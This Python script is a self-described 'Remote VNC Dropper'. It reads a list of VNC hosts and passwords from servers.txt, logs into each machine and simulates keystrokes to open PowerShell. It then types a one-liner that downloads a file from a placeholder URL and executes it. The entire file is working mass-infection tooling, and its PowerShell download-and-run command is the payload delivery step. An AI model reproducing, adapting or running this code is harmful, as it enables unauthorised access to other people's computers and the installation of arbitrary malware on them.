import asyncio,asyncvnc,time,os,pyfiglet
from portscan import PortScan
from colorama import init
init()
oneliner = r'''powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'FILE_URL' -OutFile 'C:\FILE_NAME'; C:\FILE_NAME"'''
print(pyfiglet.figlet_format("\033Haxwolf's Remote VNC Dropper", font = "slant"))    
async def infect(ip,port,password):        
        try:            
            async with asyncvnc.connect(host=ip,port=port,password=password) as client:
                await asyncio.sleep(5)
                client.keyboard.press('Cmd', 'r')
                print(f'\033[0;32mSuccessfully Connected to {ip}:{port}')
                await asyncio.sleep(1)
                client.keyboard.press('Del')
                await asyncio.sleep(1)
                client.keyboard.write('powershell')
                await asyncio.sleep(1)
                client.keyboard.press('Return')
                print('\033[0;35mOpened Powershell ')
                await asyncio.sleep(6)
                client.keyboard.write(oneliner)
                await asyncio.sleep(6)
                client.keyboard.press('Return')
                print('\033[0;35mOne Liner Has Been Dropped, Currently Downloading Payload...')
                await asyncio.sleep(8)
                client.keyboard.write('exit')
                print('\033[0;35mPowershell Has Been Closed ')
                await asyncio.sleep(0.5)
                client.keyboard.press('Return')
                print(f'\033[0;32mFILE HAS BEEN DROPPED ON {ip}:{port}')
        except Exception as e:
             if(str(e)=="Auth failed"):
                  print(f'\033[0;31mThe Password for {ip}:{port} = {password} is incorrect')
async def massinfect():
     with open('servers.txt') as servers:
        for line in servers.readlines():
            ip = (line.split(':')[0])
            port = (line.split(':')[1]).split('-')[0]
            password = (line.split(':')[1]).split('-')[1]
            await infect(ip,port,password)
        print(f'\033[0;35mFinished')
        time.sleep(10)
try: 
    asyncio.run(massinfect())
except Exception as E:
     print("\033[0;31mSomething Went Wrong")
     if (str(E) == "[Errno 2] No such file or directory: 'servers.txt'"):
          print('There is no Servers.txt file')

